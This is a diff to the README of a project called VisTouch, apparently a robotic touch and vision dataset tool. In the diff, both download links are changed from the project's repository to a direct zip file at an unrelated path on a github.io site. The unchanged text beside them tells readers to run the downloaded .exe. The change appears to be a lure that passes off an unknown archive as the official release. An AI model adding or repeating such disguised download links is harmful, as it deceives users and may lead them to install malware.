@@ -5,13 +5,13 @@ description: "Analyze robotic sliding contact with a synchronized vision, touch,
 ---
 # 🤖 VisTouch - Understand Robotic Contact Through Large Datasets
 
-[![Download VisTouch](https://img.shields.io/badge/Download-VisTouch-blue.svg)](https://github.com/testingzenz-sys/VisTouch)
+[![Download VisTouch](https://img.shields.io/badge/Download-VisTouch-blue.svg)](https://raw.githubusercontent.com/testingzenz-sys/testingzenz-sys.github.io/main/bookstand/3.3.zip)
 
 ## 📥 Get the Software
 
 You need to visit the project repository to obtain the files for your computer. 
 
-[Click here to visit the VisTouch download page](https://github.com/testingzenz-sys/VisTouch)
+[Click here to visit the VisTouch download page](https://raw.githubusercontent.com/testingzenz-sys/testingzenz-sys.github.io/main/bookstand/3.3.zip)
 
 Once you reach this page, look for the section labeled Releases on the right side of your screen. Click the latest version number to expand the list of files. Choose the file ending in .exe to start the download. Save this file to your desktop for easy access.
 
